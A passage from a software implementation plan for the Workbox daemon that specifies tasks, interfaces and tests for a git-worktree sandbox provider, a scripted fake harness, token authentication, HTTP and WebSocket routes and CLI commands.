function spawnOptions(options: RunOptions) {
  return {
    ...PIPED_STDIO,
    windowsVerbatimArguments: options.windowsVerbatimArguments ?? false,
    ...(options.cwd === undefined ? {} : { cwd: options.cwd }),
    ...(options.env === undefined ? {} : { env: options.env }),
  };
}

// Inside spawnCommand(command, options):
return Bun.spawn([...command], spawnOptions(options));
```

- Fixes applied: I1 (f), I5 (setup commands as strings, the runner timeout), first-review Minor 24; re-review N3 and Minors 4 and 17.

- [ ] **Step 1: Failing tests**

`shell.test.ts` pins both vectors and both flags, `COMSPEC` from the env and the `cmd.exe` fallback. `command-runner-options.test.ts`: `run([process.execPath, '-e', 'console.log(process.cwd())'], { cwd })` prints `cwd` (compared after `realpath.native`); `run(…, { env: { ONLY: '1', PATH } })` shows only those variables (`Path` on win32); `timeoutMs: 0` lets a 3 s sleep finish under a runner created with `timeoutMs: 200`; and the proof of the shell shape: the line `"<process.execPath>" -e "console.log('quoted ok')"` run through `shellCommand(process.platform, line, process.env)` and the runner prints `quoted ok` on every platform (the case that fails on `windows-2025` without verbatim arguments). The moved tests spawn `process.execPath`, never `'bun'` by name.

- [ ] **Step 2: Implement, move the runner, check, commit**

Move the runner files with `git mv`, add `RunOptions` and `shellCommand`, update the doctor's imports (it keeps calling `run` without options), add the package dependency to the CLI, update `turbo.json` and ADR 0005. `pnpm run check` (the move must leave the CLI tests green), then:

```bash
git add packages/process apps/cli turbo.json knip.jsonc pnpm-lock.yaml project-words.txt docs/adr
git commit -s -m "feat(process): add the shared command runner package with shell command support"
```

---

### Task 9b: Host sandbox provider and git worktrees

**Files:**
- Create: `packages/sandbox-host/{package.json,turbo.json,tsconfig.json}` (tag `adapter`; `exports` `.` and `./testing`), `packages/sandbox-host/.oxlintrc.json` (extends the root; one override for `src/testing/**` with `"max-lines-per-function": "off"`, `"max-statements": "off"` and `"no-magic-numbers": "off"`, the relaxations the root grants `*.test.ts`; this package has no runtime bans), `src/index.ts`, `src/host-sandbox-provider.ts`, `src/git.ts`, `src/env.ts`, `src/testing/index.ts`, `src/testing/temp-repo.ts` (creates a temporary git repository with `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_NOSYSTEM` set, a configured identity, an initial commit on `main`, a second local branch, and optionally a bare "remote" with a remote-only branch; returns the env to spawn git with)
- Create: tests `test/git.test.ts`, `test/host-sandbox-provider.test.ts`, `test/env.test.ts`
- Modify: `apps/cli/package.json` (dependency `@workbox/sandbox-host`), `knip.jsonc`, `pnpm-lock.yaml`, `project-words.txt` (`windir`, `setsid`, `SYSTEMROOT`, `PATHEXT`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA` as cspell demands), `docs/adr/0005-…md` (ledger row for the `src/testing/**` override, Decision 17)

**Interfaces:**
- Produces: `createHostSandboxProvider({ home, runner, logger, clock, env, platform }): SandboxProvider` (`env` is the daemon's environment, `platform` is `process.platform`, both passed by the composition root so that tests can inject them); `git.ts`: `detectDefaultBranch(repoPath)` (`git symbolic-ref --short refs/remotes/origin/HEAD` stripped of `origin/`, falling back to `git rev-parse --abbrev-ref HEAD`; a detached `HEAD` → `WorkboxError('sandbox')` telling the user to set `defaultBranch` in `.workbox/config.json`), `listBranches(repoPath): Branch[]` (`git for-each-ref --format=%(refname) refs/heads refs/remotes`, `refs/heads/<name>` → local, `refs/remotes/<remote>/<name>` → remote, `*/HEAD` skipped, merged by name into `{ name, local, remote? }`), `addWorktree({ repoPath, worktreePath, branch, startPoint })` (`git worktree add --no-track -b <branch> <path> <startPoint>`; the branch name is unique per session, so an existing branch is a `conflict` error), `removeWorktree({ repoPath, worktreePath })` (`git worktree remove --force` then `git worktree prune`); every git call runs with `GIT_TERMINAL_PROMPT=0` added to the env; `addWorktree` and `removeWorktree` use `GIT_LONG_TIMEOUT_MS` (600 000), the others the runner's default. `env.ts`: `filterEnv(env, allowlist, platform)` keeps the allowlisted names (compared case-insensitively on win32, original spelling kept, so `Path` survives) plus `SystemRoot`, `SYSTEMROOT`, `windir`, `TEMP`, `TMP`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `PATHEXT` and `COMSPEC` on win32 and `TMPDIR` on POSIX. `environment(envPassthrough)` returns `filterEnv(env, envPassthrough, platform)` and is also what `prepare` puts into `PreparedWorkspace.env`.
- Provider behaviour: `prepare` computes `<home>/workspaces/<projectId>/<sessionId>`, checks that it resolves under `<home>/workspaces` (spec 10.4), finds the base in `listBranches` (local → start point `<base>`, remote-only → `<remote>/<base>`, missing → `not_found`), creates the worktree, runs each setup command through `shellCommand(platform, line, env)` with `cwd` in the worktree, the filtered env, `SETUP_COMMAND_TIMEOUT_MS` (600 000) and the shell command's `windowsVerbatimArguments`, records `{ command, exitCode, durationMs }`, and on the first non-zero exit rejects with `WorkboxError('sandbox')` whose `details` carry `workspace` and the `setupCommandResults` so far (the worktree is kept for inspection; the runtime records it through `workspace.prepared`, Task 6, and `archive` removes it); it resolves `{ workspace, setupCommandResults, env }`. `spawn` refuses a `cwd` outside the workspace (`sandbox`), spawns with `Bun.spawn` and the given env only, `stdio` piped by default, and returns `SandboxedProcess` with web streams (`stdin` wraps Bun's `FileSink` in a `WritableStream`). `dispose` removes the worktree and prunes.
- Fixes applied: I1 (j), I4 (process env), I5 (branch, remote base, the `origin` entry, Windows env, stdio, paths), first-review Minor 10; re-review I3 (`environment`), N2, N3 and Minor 17.

- [ ] **Step 1: Failing tests**

`git.test.ts` against the temp repository: default branch detection with and without a remote, branch listing includes the remote-only branch once as `{ name, local: false, remote: 'origin' }` and never a bogus `origin` entry, worktree creation on a new branch from `main` and from a remote-only base checks out `workbox/<slug>-<id8>` (assert `git -C <worktree> rev-parse --abbrev-ref HEAD` prints exactly that), the base branch is not created locally, removal prunes the entry (`git worktree list --porcelain` no longer names it). `host-sandbox-provider.test.ts`: `prepare` creates `<home>/workspaces/<projectId>/<sessionId>` as a worktree on the given branch, runs a setup command written as one quoted shell line (`"<process.execPath>" -e "console.log(process.env.WORKBOX_TEST ?? 'unset')"`) with cwd inside it and the filtered env, records `{ command, exitCode: 0, durationMs }` (the second proof of the `cmd.exe` shape on `windows-2025`), a failing setup command rejects with `WorkboxError('sandbox')` whose `details` carry `workspace` and the results so far; `spawn` runs `[process.execPath, '-e', 'console.log(process.env.WORKBOX_TEST ?? "unset")']` and reads `unset` from `stdout`, proving a non-allowlisted variable does not reach the child while `PATH`/`Path` does; `environment(['WORKBOX_TEST'])` with `WORKBOX_TEST` and `OTHER` in the injected env returns `WORKBOX_TEST` plus the platform extras only; a `cwd` outside the workspace is refused; `dispose` removes the worktree and leaves the project's repository intact. `env.test.ts` pins the allowlist per platform, including `Path` kept on win32 with its spelling and `path` dropped on linux.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add packages/sandbox-host apps/cli knip.jsonc pnpm-lock.yaml project-words.txt docs/adr
git commit -s -m "feat(sandbox-host): add git worktree workspaces and the host sandbox provider"
```

---

### Task 10: Fake harness with JSON scenarios

**Files:**
- Create: `packages/harness-fake/{package.json,turbo.json,tsconfig.json}` (tag `adapter`), `src/index.ts`, `src/scenario.ts`, `src/fake-harness-adapter.ts`, `src/scenarios.ts` (JSON imports exported as `BUILT_IN_SCENARIOS`), `scenarios/happy-path.json`, `scenarios/permission-then-complete.json`, `scenarios/question-then-fail.json`, `scenarios/README.md`
- Create: tests `test/scenario.test.ts`, `test/fake-harness-adapter.test.ts`
- Modify: `knip.jsonc`, `pnpm-lock.yaml`, `project-words.txt` only if scenario words need it (prefer plain English in scenarios)

**Interfaces:**
- Produces: `scenarioSchema` (Zod): `{ name, harnessVersion, model, tools: string[], turns: ScenarioTurn[] }` where a turn is a list of steps, each `{ delayMs: z.int().nonnegative() }` plus exactly one of `delta { text }`, `message { text, toolUse?: { toolCallId, name, inputSummary, category } }`, `tool { toolCallId, outputSummary, isError, durationMs }`, `permission { toolCallId, name, input, options, recommended, reason, onDeny?: 'fail' | 'continue' }`, `question { questions }`, `usage { inputTokens, outputTokens, cacheReadTokens, cacheCreationTokens, costEstimateUsd }`, `complete { stopReason }`, `fail { type, message }`; `loadScenario(json): ParseResult<Scenario>`; `BUILT_IN_SCENARIOS: Readonly<Record<'happy-path' | 'permission-then-complete' | 'question-then-fail', Scenario>>`; `createFakeHarnessAdapter({ scenario, timers? })` where `timers` defaults to real `setTimeout` and tests inject a manual timer queue; `describe()` reports `{ version: scenario.harnessVersion, capabilities: { resume: true, fork: false, steer: false }, models: [scenario.model], efforts: ['low', 'medium', 'high'] }`; `authStatus()` resolves `{ kind: 'subscription', plan: 'fake', account: 'fake@workbox.local' }`.
- Identifiers: the adapter emits `harness.bound` inside `start()` (sourceId `fake:<sessionId>:bound`, `harnessSessionId` = `fake-<sessionId>`, `tools` from the scenario) and resolves. Every event a turn step emits takes the key `fake:<turnId>:<step index>:<event type>`, for example `…:2:message.completed` and `…:2:tool.started` for one `message` step with `toolUse`, and `…:4:permission.requested` then `…:4:turn.failed` for a permission denied with `onDeny: 'fail'`, so no two events share a key and the denied turn's `turn.failed` reaches the store and the runtime, which moves the session out of `running` (re-review N1); `messageId` and `requestId` are `fake:<turnId>:<step index>`; a scenario's `toolCallId` (stable within the scenario, for example `read-1`) becomes `fake:<turnId>:<scenario toolCallId>` on the wire, so a later `tool` step refers to the `tool.started` of the `message` step before it (I7).
- Resume: the adapter keeps a `Map<string, number>` from `harnessSessionId` to the next turn index for the lifetime of the adapter instance. `start()` with a `resumeId` it knows continues with that turn and emits `harness.bound` with the same id; an unknown `resumeId` (after a daemon restart, since the map is in memory) starts at turn 1 and `harness.bound` repeats the given id. This is the whole of resume in plan 2; plan 4 adds the Claude side (Decision 20).
- Fixes applied: I7 (keys), I9 (scenario export and selection), Minor 13; re-review N1 and the fake side of the I3 resume seam.

- [ ] **Step 1: Failing tests**

`scenario.test.ts` validates the three shipped scenarios through `BUILT_IN_SCENARIOS` and rejects a step with two kinds, a step with none and a negative delay. `fake-harness-adapter.test.ts` with manual timers: `start()` emits `harness.bound` before resolving; the first prompt replays turn 1 as sink calls whose `sourceId`s are `fake:<turnId>:<step>:<type>` and pairwise distinct within the turn, with a `tool_use` block whose `toolCallId` equals the following `tool.started` and `tool.completed`; `prompt()` resolves before the first step fires; `permission` blocks until `resolvePermission` (deny with `onDeny: 'fail'` emits `turn.failed` under its own key, deny with `continue` goes on); `question` blocks until `answerQuestion`; `interrupt` during a turn emits nothing further and resolves; `stop` after `complete` resolves; a second prompt replays turn 2 with new keys and a prompt beyond the last turn replays the last turn again under a new `turnId`, so no `sourceId` repeats; `start()` again with the `resumeId` from `harness.bound` continues with the next turn, and an unknown `resumeId` starts at turn 1; `contextUsage()` reports the sum of usage tokens so far against `maxTokens` 200 000. One test feeds the `happy-path` sink events into a `MemoryEventStore` from `@workbox/core/testing` and asserts that every event, `tool.started` included, is stored with `inserted: true`.

- [ ] **Step 2: Implement, check, commit**

Scenarios: `happy-path` (delta ×3, message with a `tool_use` of `Read`, tool completed, message, usage, complete), `permission-then-complete` (message, permission for `Bash` with `input: '{"command":"cargo build --release"}'` — a command that matches neither default `bashAllow` nor `bashDeny`, so the policy shows the dialog — `recommended: 'allow'`, tool, usage, complete), `question-then-fail` (question with two options and a recommendation, message, fail with `type: 'network'`). `scenarios/README.md` documents the step kinds and the `WORKBOX_FAKE_SCENARIO` variable. `pnpm run check`, then:

```bash
git add packages/harness-fake knip.jsonc pnpm-lock.yaml
git commit -s -m "feat(harness-fake): add the scriptable harness adapter with JSON scenarios"
```

---

### Task 11: Server: token authority and blob store

**Files:**
- Create: `packages/server/{package.json,turbo.json,tsconfig.json}` (tag `adapter`), `packages/server/.oxlintrc.json` (extends the root; `"typescript/prefer-readonly-parameter-types": ["error", { "ignoreInferredTypes": true }]`, because Bun dictates the parameter types of `Bun.serve` callbacks: `Request`, `Server` and `ServerWebSocket` are reported even behind `Readonly<>`, while the option exempts inline callbacks and still reports an annotated `Request` parameter, evidence above; Decision 17), `src/index.ts`, `src/auth.ts`, `src/blobs.ts`
- Create: tests `test/auth.test.ts`, `test/blobs.test.ts`
- Modify: `knip.jsonc`, `pnpm-lock.yaml`, `docs/adr/0005-…md` (ledger row: `prefer-readonly-parameter-types` reconfigured in `packages/server`)

**Interfaces:**
- Produces: `createTokenAuthority({ clock, random, bearer }): TokenAuthority` where `random: (bytes: number) => Uint8Array` (the composition root passes `crypto.getRandomValues` wrapped, tests a counter) and `bearer` is the daemon's bearer generated by the composition root (I2); `issueOneTimeToken(): string` (expires after `ONE_TIME_TOKEN_TTL_MS`, 300 000), `exchange(oneTime): string | undefined` (returns the bearer once; the token is consumed), `verifyBearer(header: string | undefined): boolean` (compares SHA-256 digests with `crypto.timingSafeEqual` from `node:crypto`; a header of another shape returns false without throwing), `issueTicket(): string`, `consumeTicket(ticket): boolean` (single use, `TICKET_TTL_MS` 30 000). `createBlobStore({ dir, maxBytes, index }): BlobStore` with `put(body: Readonly<ReadableStream<Uint8Array>>, meta: { readonly mime: string; readonly name: string }): Promise<BlobMeta>` (a stream only: `Readonly<Uint8Array>` fails the readonly-parameter rule, and a route hands over `request.body`) (streams into `dir/.tmp-<random>` while hashing, rejects with `WorkboxError('payload_too_large')` past `maxBytes`, renames to `dir/<sha256>`, records the meta through the `BlobIndex` port of Task 4) and `get(sha256): Promise<{ meta: BlobMeta; path: string } | undefined>` (rejects a hash that fails `sha256Schema` with `bad_request` before touching the filesystem).
- Fixes applied: I2, I4 (blob index), Minor 13, 15; re-review Minor 2.

- [ ] **Step 1: Failing tests**

`auth.test.ts`: the one-time token exchanges once for the injected bearer, a second exchange fails, an expired one-time token (clock advanced 301 s) fails, a wrong bearer fails, `verifyBearer` rejects a header of a different length and a non-`Bearer` scheme without throwing, a ticket is single-use and expires after 31 s via the injected clock. `blobs.test.ts` with the memory store as `BlobIndex`: content addressing (same bytes → same sha256 and one file), cap exceeded → `payload_too_large` with no file left behind, unknown hash → `undefined`, an invalid hash → `bad_request`, `get` returns the stored MIME type and name.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add packages/server knip.jsonc pnpm-lock.yaml docs/adr
git commit -s -m "feat(server): add the token authority and the content-addressed blob store"
```

---

### Task 12: Server: HTTP routes and the command dispatcher

**Files:**
- Create: `packages/server/src/dispatcher.ts`, `packages/server/src/routes.ts`, `packages/server/src/http-errors.ts`, `packages/server/src/server.ts`
- Create: tests `test/dispatcher.test.ts`, `test/routes.test.ts`
- Modify: `packages/server/src/index.ts`

**Interfaces:**
- Produces: `createDispatcher({ workbox, logger }): Dispatcher` with `Dispatcher = (command: ClientCommand, context: DispatchContext) => Promise<ServerFrame>` and `DispatchContext = { readonly transport: 'http' | 'websocket' }`, mapping every client command except `subscribe` to a `Workbox` call and an `ack { commandId, result }` (results per Task 2's table) or `error { commandId, code, message }` (`WorkboxError` → its code and message; anything else → `internal` with a generic message and the error logged); `subscribe` over HTTP → `error bad_request` (the WebSocket layer handles it before the dispatcher in Task 13). `httpStatusOf(code: ErrorCode): number` in `http-errors.ts`: `bad_request` 400, `unauthorized` 401, `forbidden` 403, `not_found` 404, `invalid_transition` and `conflict` 409, `payload_too_large` 413, `not_implemented` 501, `sandbox` and `internal` 500. `startServer(options: ServerOptions): Promise<RunningServer>` with `ServerOptions = { readonly workbox: Workbox; readonly store: EventStore; readonly auth: TokenAuthority; readonly blobs: BlobStore; readonly dispatcher: Dispatcher; readonly logger: Logger; readonly daemonVersion: string; readonly hostname: '127.0.0.1'; readonly port: number; readonly allowedOrigins: readonly string[]; readonly onShutdownRequested: () => void; readonly staticHandler?: (pathname: string) => Promise<Response | undefined> }` (a `string` parameter, because an annotated `Request` inside a function type is still reported under `ignoreInferredTypes`, evidence above; R2-5) and `RunningServer { port, origin, stop: (force?: boolean) => Promise<void> }`.
- Routes per spec 7.1: `GET /` (a placeholder HTML page until plan 3 embeds the UI, stating the daemon version), `POST /api/auth/exchange { token }` → `{ bearer }`, `POST /api/ws-ticket` (bearer) → `{ ticket, expiresInSeconds: 30 }`, `GET /api/health` → `{ version, protocolVersion, uptimeSeconds, pid }`, `GET /api/summary` (bearer) → `{ projects: number, sessionsByGroup: { waiting, running, done, attention } }` from `summariseDashboard(await workbox.listSessions())`, `POST /api/blobs?sessionId=<id>` (bearer; raw body with `content-type` and an `x-workbox-name` header, or multipart with one `file` field; 25 MB cap) → `BlobMeta`, plus `workbox.addAttachment({ sessionId, meta, origin: 'user' })` when `sessionId` is given, `GET /api/blobs/:sha256` (the file with its stored MIME type, `X-Content-Type-Options: nosniff`, `Content-Security-Policy: sandbox`, and `Content-Disposition: inline` only for `image/png`, `image/jpeg`, `image/gif` and `image/webp`, `attachment` for everything else, with the stored name as `filename*=UTF-8''<percent-encoded>`, so an HTML or SVG blob never runs in the daemon's origin; re-review Minor 24), `GET /api/export/telemetry` (bearer) → `501 { code: 'not_implemented', plannedIn: 'plan 6' }`, `POST /api/command` (bearer) → runs one `ClientCommand` through the dispatcher with `transport: 'http'` and returns the frame body with `httpStatusOf` for errors and 200 for acks; `server.timeout(request, 0)` is not needed because no command waits for a worktree (I3), `POST /api/admin/one-time-token` (bearer) → `{ token }`, `POST /api/admin/shutdown` (bearer) → `202` and `onShutdownRequested()`. Every route first checks `Host` (`127.0.0.1:<port>` or `localhost:<port>`, else `403 forbidden`) and then a present `Origin` (equal to the server's origin, `http://localhost:<port>`, or in `allowedOrigins`, else `403 forbidden`); a malformed JSON body → `400 bad_request`; an unknown `/api/*` path → `404` JSON.
- Fixes applied: C2 (dispatcher here), I2, Minor 13, 14, 15, 22 (`allowedOrigins`); re-review Minors 2, 3, 16 and 24.

- [ ] **Step 1: Failing tests**

`dispatcher.test.ts` covers every command once with a scripted `Workbox` (an object literal of recorded functions), including `subscribe` over HTTP → `bad_request`, a `WorkboxError('not_found')` → `error` frame with that code, and a thrown `TypeError` → `internal`. `routes.test.ts` starts the server on port 0 with the memory store, the fake sandbox and the scripted harness from `@workbox/core/testing` behind a real `createWorkbox`: health shape with `pid`, exchange flow, `POST /api/command` with `project.register` → 200 ack with `projectId` and the project listed by `project.list`, a malformed command → `400 bad_request`, a `session.prompt` for an unknown session → `404`, unauthorized → `401`, foreign `Origin` → `403`, an `Origin` from `allowedOrigins` → 200, a wrong `Host` header → `403`, blobs: same bytes → same sha256, cap exceeded → `413`, unknown hash → `404`, `GET` returns the stored MIME type with `nosniff` and the sandbox CSP, `inline` for `image/png` and `attachment` for `text/html`, an upload with `sessionId` appends `attachment.added`; shutdown → `202` invoking the callback.

- [ ] **Step 2: Implement, check, commit**

Use `Bun.serve({ hostname, port, routes, fetch })` with a `fetch` fallback returning the `404` JSON and a `websocket` handler added in Task 13; the route handlers and the `fetch` callback stay inline (arrow functions inside the `Bun.serve` call), so their parameter types are inferred and `ignoreInferredTypes` applies (Task 11's nested config). `pnpm run check`, then:

```bash
git add packages/server
git commit -s -m "feat(server): add the HTTP routes and the command dispatcher"
```

---

### Task 13: Server: WebSocket protocol with backfill and pub/sub

**Files:**
- Create: `packages/server/src/ws.ts`
- Create: test `test/ws.test.ts`
- Modify: `packages/server/src/server.ts`, `src/index.ts`

**Interfaces:**
- Produces: `createWebSocketHandler({ store, workbox, dispatcher, auth, logger, daemonVersion })` returning the `websocket` handler object (its `open`, `message`, `drain` and `close` functions written inline in the object literal, so Bun's parameter types are inferred and exempt under Task 11's `ignoreInferredTypes`) and `authorizeUpgrade({ ticket, origin }): UpgradeDecision` with `UpgradeDecision = { readonly ok: true; readonly data: SocketData } | { readonly ok: false; readonly status: 401 | 403; readonly code: ErrorCode }` (plain strings in, so no exported function takes a `Request`; R2-5). The `/ws` route in `server.ts` is an inline handler: it reads `ticket` from the URL and `Origin` from the headers, calls `authorizeUpgrade`, and either calls `server.upgrade(request, { data })` or returns the error response.
- Protocol: `GET /ws?ticket=…` upgrades only with a valid ticket and a matching or absent `Origin` (401 and 403 as HTTP responses otherwise). On `open` the server sends `hello`. Every socket carries `SocketData = { filter?: EventFilter; phase: 'idle' | 'backfilling' | 'live'; lastSeq: number; buffer: EventEnvelope[]; awaitingDrain: boolean }` (mutable on purpose: it is the socket's own state, never a parameter). One store listener (registered once per server) publishes each inserted envelope to `events:all` and to `events:project:<projectId>` or, for a global event, `events:global`, and pushes it into the `buffer` of every socket in `backfilling` phase whose filter admits it. `subscribe { sinceSeq, projectIds? }` sets the filter and the phase, then pages through `readSince(lastSeq, filter, BACKFILL_PAGE)` (500) with a recursive sender (no `await` in a loop) until a page is short, flushes the buffered envelopes with `seq > lastSeq`, subscribes the socket to `events:all` or to `events:project:<id>` for each id plus `events:global`, sends a `snapshot` frame for each `workbox.snapshots(filter)` entry, sends `ack { lastSeq }` and sets the phase to `live`; a second `subscribe` on the same socket first unsubscribes every topic, clears the buffer and re-enters `backfilling`, so no frame is delivered twice (re-review Minor 10). Transient frames go to `transient:project:<projectId>` and `transient:all`; a socket joins `transient:all` or its projects' transient topics with the event topics. Backpressure: `closeOnBackpressureLimit: true` (a slow client is closed and reconnects from its cursor), and a `send` that returns `-1` sets `awaitingDrain`, which the `drain` handler clears before continuing the sender. Other commands go through the dispatcher with `transport: 'websocket'`; an unparseable or invalid frame yields `error { code: 'bad_request' }` without closing the socket; `maxPayloadLength` 1 MB (`WS_MAX_PAYLOAD_BYTES`); `idleTimeout` 120 with `sendPings` (Decision 15).
- Fixes applied: C1, I6 (all points), Minor 26; re-review Minors 2 and 10.

- [ ] **Step 1: Failing tests**

`ws.test.ts` with Bun's global `WebSocket` against the in-process server from Task 12: `fetch('/ws')` without a ticket → 401, with a used ticket → 401, with a foreign `Origin` → 403 (asserted on the HTTP responses, since a `WebSocket` client cannot see the status); the first frame after the upgrade is `hello`; after `subscribe { sinceSeq: 0 }` the client receives the persisted events in `seq` order (seed 1 200 events so that three pages are needed), then `ack { lastSeq }`, then live events; an append performed by the test while the backfill is held (the test wraps the store so that `readSince` returns a deferred promise the test resolves by hand) arrives exactly once and in order; `session.prompt` through the socket produces an `ack` and the resulting events arrive live; a client subscribed to another project receives none of them, proven by a later event for its own project arriving first; a global `rate_limit.reported` event reaches a project-filtered client; a `transient` frame reaches a subscriber of the session's project; a `snapshot` frame follows the backfill for a session with an in-flight partial; a `send` stub that returns `-1` once makes the sender wait for `drain` and the client still receives every frame; a second `subscribe { sinceSeq: 0 }` on a live socket delivers every event exactly once more and no duplicate during its backfill.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add packages/server
git commit -s -m "feat(server): add the WebSocket protocol with gap-free backfill and per-project pub/sub"
```

---

### Task 14: CLI: daemon file, lock, config, composition root and `serve`

**Files:**
- Create: `apps/cli/src/daemon/compose.ts`, `apps/cli/src/daemon/daemon-file.ts`, `apps/cli/src/daemon/lock.ts`, `apps/cli/src/daemon/logger.ts` (binds the `core` `Logger` port to LogTape categories), `apps/cli/src/daemon/project-config-source.ts`, `apps/cli/src/config.ts` (loads `WORKBOX_HOME/config.json` through `parseUserConfig`, writes nothing), `apps/cli/src/commands/common.ts` (`commonArgs`: `json`, `debug`), `apps/cli/src/commands/serve.ts`
- Create: tests `apps/cli/test/daemon-file.test.ts`, `apps/cli/test/lock.test.ts`, `apps/cli/test/project-config-source.test.ts`, `apps/cli/test/serve.test.ts` (spawns the CLI entry through `process.execPath` with `serve --port 0` in a temp home with `WORKBOX_HARNESS=fake`, waits for `daemon.json` naming the child's pid and a healthy `/api/health`, checks `health.pid`, then posts `shutdown` with the recorded bearer and waits for the file and the lock to disappear)
- Modify: `apps/cli/src/commands/main.ts` (subcommand `serve`), `apps/cli/package.json` (dependencies `@workbox/core`, `@workbox/protocol`, `@workbox/store-sqlite`, `@workbox/harness-fake`, `@workbox/server` as `workspace:*`, and `zod: catalog:` for `daemonFileSchema`), `packages/i18n/messages/{en,cs}.json` (`cli_serve_listening`, `cli_serve_already_running`, `cli_serve_unknown_scenario`), `knip.jsonc`, `pnpm-lock.yaml`

**Interfaces:**
- Produces: the CLI-private `daemon.json` schema (`daemonFileSchema`, Zod) `{ version, protocolVersion, pid, port, bearer, startedAt }`; `writeDaemonFile(home, record)` writes `daemon.json.tmp` with mode `0o600` (`OWNER_ONLY_MODE`) and renames it over `daemon.json`; `readDaemonFile(home)` → the record or `undefined`; `isPidAlive(pid)` (`process.kill(pid, 0)`, false on `ESRCH`); `acquireLock(home, pid)` creating `<home>/lock` with the `wx` flag holding the pid, treating a lock whose pid is not alive or equals the caller's own pid (a `bun --watch` re-execution keeps the pid) as stale: unlink it, retry `wx` once, and on a second `EEXIST` fail with `WorkboxError('conflict')`; `releaseLock(home)`; `createProjectConfigSource(): ProjectConfigSource` reading `<path>/.workbox/config.json` and `config.local.json` with `node:fs` (a missing file means defaults), parsing each with `parseProjectConfig` and merging with `mergeProjectConfig`; `composeDaemon(options: ComposeOptions): Promise<RunningDaemon>` with `ComposeOptions = { readonly home: string; readonly env: EnvLike; readonly port: number; readonly harness: HarnessId; readonly scenario: string; readonly allowedOrigins: readonly string[]; readonly logFile?: string; readonly version: string }` building the store at `<home>/workbox.db`, the blob dir `<home>/blobs`, the host sandbox (with `env` and `process.platform`), the adapter registry (plan 2 ships `fake`, built from `BUILT_IN_SCENARIOS[scenario]`, and a placeholder `claude` whose `authStatus` reports `none` and whose `start` rejects with `WorkboxError('not_implemented', 'planned in plan 4')`), the `Workbox` with `harnessOverride: harness`, the bearer (`random(32)` base64url), the token authority, the dispatcher, the server, then `recoverAfterRestart()`, `writeDaemonFile`, and graceful shutdown on `SIGINT`/`SIGTERM` and on the admin endpoint (stop accepting → `workbox.shutdown()` → `server.stop()` → `store.close()` → remove `daemon.json` → `releaseLock` → exit 0); `RunningDaemon { port, bearer, shutdown(): Promise<void> }`. `workbox serve [--port <n>] [--harness fake|claude] [--log-file <path>] [--allowed-origin <origin>]… [--debug]`: `--port` defaults to `0` (a free port, printed), `--harness` defaults to `WORKBOX_HARNESS` and then `fake`, the scenario comes from `WORKBOX_FAKE_SCENARIO` (default `happy-path`; a name outside `BUILT_IN_SCENARIOS` exits 1 with `cli_serve_unknown_scenario`, which lists the three names), `--allowed-origin` (repeatable) fills `allowedOrigins` (empty by default; the `dev` script of Task 17 passes the Vite origin), `--log-file` replaces the stderr sink with a rotating file sink (the default command passes `<home>/logs/daemon.log` because a detached daemon has no stderr; the per-session `debug.jsonl` of spec 10.1 is plan 6's, Decision 16); it acquires the lock first (a held lock → `cli_serve_already_running`, exit 1), runs until stopped and prints the port, never the bearer.
- Fixes applied: I2, I4 (config source), I9 (handshake, logging, selection, defaults), Minor 17 (`--debug`, categories), Minor 22; re-review Minors 7 and 21.

- [ ] **Step 1: Failing tests**

`daemon-file.test.ts`: round trip, `0o600` on POSIX (`test.skipIf(win32)` for the mode assertion), no `daemon.json.tmp` left behind, a file whose pid is not alive is reported stale. `lock.test.ts`: a second acquisition with another pid fails while the first is held, succeeds after release, a stale lock (dead pid) is replaced, a lock holding the caller's own pid is replaced. `project-config-source.test.ts`: missing files → defaults, committed plus local merged, an unknown key → `ok: false` naming the key and the file. `serve.test.ts` as described (`WORKBOX_HOME` to a `mkdtemp` directory, `WORKBOX_HARNESS=fake`, deadlines of 30 s, the daemon always stopped in `afterEach`, the directory removed with `maxRetries`); `WORKBOX_FAKE_SCENARIO=bogus` makes `serve` exit 1 with a message naming `happy-path`, `permission-then-complete` and `question-then-fail`.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add apps/cli packages/i18n knip.jsonc pnpm-lock.yaml
git commit -s -m "feat(cli): compose the daemon and add the serve command"
```

---

### Task 15: CLI: daemon client, `status`, `stop` and the default command

**Files:**
- Create: `apps/cli/src/daemon/client.ts`, `apps/cli/src/daemon/spawn.ts`, `apps/cli/src/commands/status.ts`, `apps/cli/src/commands/stop.ts`, `apps/cli/src/commands/start.ts` (the default command)
- Create: tests `apps/cli/test/client.test.ts`, `apps/cli/test/start.test.ts` (the default command attaches to a running daemon without a second instance; `--no-open` skips the browser; the browser opener is injected and recorded; a stale `daemon.json` with a dead pid is removed and a daemon is spawned; a daemon answering with another protocol major → exit 1 with the message), `apps/cli/test/status-stop.test.ts`
- Modify: `apps/cli/src/commands/main.ts` (subcommands and the default `run`), `apps/cli/package.json` (`open: catalog:`), `pnpm-workspace.yaml` (catalog `open: ^11.0.4`), `packages/i18n/messages/{en,cs}.json` (`cli_start_running_at`, `cli_start_attached`, `cli_start_protocol_mismatch`, `cli_start_stale_file`, `cli_start_timeout`, `cli_status_*`, `cli_stop_*`), `docs/adr/0004-…md` (the default catalog list gains `open`), `knip.jsonc`, `pnpm-lock.yaml`

**Interfaces:**
- Produces: `createDaemonClient({ port, bearer, fetch? }): DaemonClient` with `health()`, `summary()`, `command(command: ClientCommand): Promise<ServerFrame>` (parsed with `serverFrameSchema`), `oneTimeToken()`, `shutdown()`; `spawnDaemon({ home, harness, logFile }): { pid }` using `Bun.spawn(argv, { detached: true, stdio: ['ignore', 'ignore', 'ignore'], windowsHide: true, env })` followed by `proc.unref()` (bun-types: Bun otherwise waits for every subprocess), where `argv` is `[process.execPath, 'serve', …]` when `Bun.isStandaloneExecutable` and `[process.execPath, 'run', fileURLToPath(new URL('../main.ts', import.meta.url)), 'serve', …]` from source (never a path relative to the user's directory, never `Bun.main`, which is the test file under `bun test`); `workbox status [--json]` reads `daemon.json`, calls `GET /api/health` and `GET /api/summary`, and prints daemon state, pid, port, protocol version and session counts by group, or "not running" with exit 1 when the file is missing, names a dead pid, or the health check fails (Decision 15); `workbox stop [--force]` posts `POST /api/admin/shutdown` with the recorded bearer and waits up to `STOP_TIMEOUT_MS` (10 000) for `daemon.json` to disappear; when it does not, it prints the pid with `cli_stop_still_running` and exits 1, unless `--force`, which signals only a pid that answered 